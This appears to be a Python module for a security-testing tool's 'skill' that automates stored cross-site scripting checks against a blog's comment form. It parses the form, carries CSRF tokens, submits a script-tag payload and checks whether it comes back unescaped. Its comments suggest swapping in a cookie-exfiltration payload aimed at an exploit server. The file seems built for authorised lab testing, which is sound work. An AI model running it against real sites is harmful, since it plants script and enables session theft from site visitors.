import html
import os
import re
from html.parser import HTMLParser
from urllib.parse import urljoin

import requests


class _FormParser(HTMLParser):
    """Collect every <form> on a page with its action, method and fields."""

    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict] = []
        self._cur: dict | None = None

    def handle_starttag(self, tag: str, attrs: list) -> None:
        a = dict(attrs)
        if tag == "form":
            self._cur = {
                "action": a.get("action", ""),
                "method": (a.get("method") or "post").lower(),
                "inputs": {},  # name -> value (carries hidden csrf etc.)
                "textarea_name": None,  # the comment box, usually a <textarea>
            }
        elif self._cur is not None and tag == "input":
            name = a.get("name")
            if name:
                self._cur["inputs"][name] = a.get("value", "")
        elif self._cur is not None and tag == "textarea":
            name = a.get("name")
            if name:
                self._cur["textarea_name"] = name
                self._cur["inputs"].setdefault(name, "")

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def _comment_form(html_text: str) -> dict | None:
    """Pick the comment form: one with a <textarea> or a field named 'comment'."""
    parser = _FormParser()
    parser.feed(html_text)
    for form in parser.forms:
        fields = {n.lower() for n in form["inputs"]}
        if form["textarea_name"] or "comment" in fields or "comment" in form["action"].lower():
            return form
    return None


def stored_xss_comment(url: str, payload: str = "", post_id: int = 0) -> dict:
    """Test a blog for STORED XSS via its comment form (authorised targets only).

    Finds a blog post and its comment form, submits a uniquely-marked payload
    into the comment field (carrying any CSRF token and required fields), then
    reloads the post to check whether the payload is stored *unescaped* -- the
    signature of stored XSS that will execute when the post is viewed.

    Args:
        url: Base URL of the target site (e.g. the lab root).
        payload: Optional custom payload. Defaults to a uniquely-marked script
                 tag. Supply your own (e.g. a cookie-exfil script pointing at
                 your exploit server) to weaponise the PoC on an authorised lab.
        post_id: Optional specific blog post id; if 0, the first post found is used.

    Returns:
        dict describing the post, the form, the payload, and whether it was
        stored unescaped (vulnerable) -- or an {"error": ...} dict.
    """
    if os.environ.get("SLEUTH_ALLOW_ACTIVE_SKILLS", "").strip().lower() not in (
        "1",
        "true",
        "yes",
        "on",
    ):
        return {
            "ok": False,
            "error": "Skill 'stored_xss_comment' is disabled. "
            "Set SLEUTH_ALLOW_ACTIVE_SKILLS=true for authorised targets only.",
        }

    marker = "sleuthxss" + os.urandom(4).hex()
    if not payload:
        payload = f"<script>/*{marker}*/</script>"
    elif marker not in payload:
        # Tag the custom payload so we can find exactly it in the response.
        payload = f"{payload}<!--{marker}-->"

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (Sleuth authorised test)"

    # 1. Locate a blog post.
    try:
        if post_id:
            post_url = urljoin(url, f"/post?postId={post_id}")
        else:
            root = session.get(url, timeout=15)
            m = re.search(r'href="([^"]*post\?postId=\d+)"', root.text)
            if not m:
                return {
                    "error": "no blog post link (/post?postId=) found on the page",
                    "hint": "pass post_id=N explicitly if the URL scheme differs",
                }
            post_url = urljoin(url, html.unescape(m.group(1)))

        # 2. Load the post and parse its comment form.
        post = session.get(post_url, timeout=15)
        form = _comment_form(post.text)
        if not form:
            return {"error": "no comment form found on the post page", "post_url": post_url}

        comment_field = form["textarea_name"] or next(
            (n for n in form["inputs"] if n.lower() == "comment"), None
        )
        if not comment_field:
            return {
                "error": "comment form has no identifiable comment field",
                "post_url": post_url,
                "fields": list(form["inputs"]),
            }

        # 3. Build the submission: keep hidden fields (csrf, postId), fill the rest.
        data = dict(form["inputs"])
        data[comment_field] = payload
        for field, value in (
            ("name", "sleuth"),
            ("email", "sleuth@example.com"),
            ("website", f"https://example.com/{marker}"),
        ):
            if field in data:
                data[field] = value

        action = urljoin(post_url, form["action"] or "")
        submit = session.post(action, data=data, timeout=15)

        # 4. Reload the post and look for the payload, unescaped vs escaped.
        reloaded = session.get(post_url, timeout=15)
        stored_unescaped = payload in reloaded.text
        stored_escaped = (not stored_unescaped) and (
            html.escape(payload) in reloaded.text or marker in reloaded.text
        )
    except requests.RequestException as exc:
        return {"error": f"request failed: {exc}"}

    return {
        "target": url,
        "post_url": post_url,
        "form_action": action,
        "comment_field": comment_field,
        "fields_submitted": sorted(data),
        "payload": payload,
        "submit_status": submit.status_code,
        "stored_unescaped": stored_unescaped,
        "stored_but_escaped": stored_escaped,
        "vulnerable": stored_unescaped,
        "note": (
            "STORED XSS CONFIRMED: the payload is stored unescaped and will "
            "execute when the post is viewed. Swap in a cookie-exfil payload "
            "pointing at your exploit server to complete the lab."
            if stored_unescaped
            else "Payload not found unescaped. The field may be escaped/sanitised, the "
            "comment may await moderation, or the injection point differs. Try a "
            "custom payload or the 'website' field."
        ),
    }
